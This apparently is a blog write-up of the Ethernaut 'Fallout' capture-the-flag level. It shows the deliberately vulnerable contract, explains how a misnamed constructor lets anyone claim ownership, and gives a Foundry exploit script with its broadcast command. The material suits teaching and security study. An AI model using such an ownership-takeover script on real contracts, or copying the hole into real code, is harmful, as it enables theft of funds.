---
title: 'Fallout - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level2.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-16
lastmod: 2025-09-16
---

## Challenge Overview

In this level, we interact with a contract called **Fallout**.
The goal is to:

1. Become the owner of the contract.

At first glance, ownership seems to be permanently assigned to the deployer via a constructor. However, a critical typo in the constructor's name makes it a public function, allowing anyone to claim ownership.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

---

## Exploit Explanation

The vulnerability lies in the misnamed constructor function:

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

* In Solidity versions <0.7.0, a constructor is defined by a function with the **exact same name as the contract**.
* The function `Fal1out()` (with a number '1') does not match the contract name `Fallout` (with the letter 'o'), so it is **not a constructor** but a regular public function.
* This means **anyone can call this function** at any time to reassign the `owner` to themselves.

So the exploit sequence is simple:

1. Call the `Fal1out()` function.
2. The function executes, setting `msg.sender` (our address) as the new `owner`.

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Debug logs before attack
        console.log("Owner before attack:", falloutInstance.owner());

        // Step 1: Call the misnamed constructor function
        falloutInstance.Fal1out();

        // Debug logs after attack
        console.log("Owner after attack:", falloutInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Run the exploit with Foundry:

```bash
forge script script/FalloutSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

## Solving SafeMath Import Issue

If you encounter import/remapping issues for the SafeMath library in the challenge contract, follow these steps to resolve them in a Foundry project.

### 1. Configure `foundry.toml`

Create or modify `foundry.toml` with the following settings:

```toml
solc_version = "0.6.0"
remappings = [
    "forge-std/=lib/forge-std/src/",
    "@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/"
]
```

### 2. Install the Correct OpenZeppelin Release

Install the version of OpenZeppelin contracts that matches the Solidity version:

```bash
forge install openzeppelin/openzeppelin-contracts@v3.4.2
```

### 3. Update the Import Path

Modify the import statement in the challenge contract to use the remapped path:

```diff
- import "openzeppelin-contracts-06/math/SafeMath.sol";
+ import "@openzeppelin/contracts/math/SafeMath.sol";
```

This ensures the compiler correctly resolves the SafeMath dependency for `pragma solidity ^0.6.0`.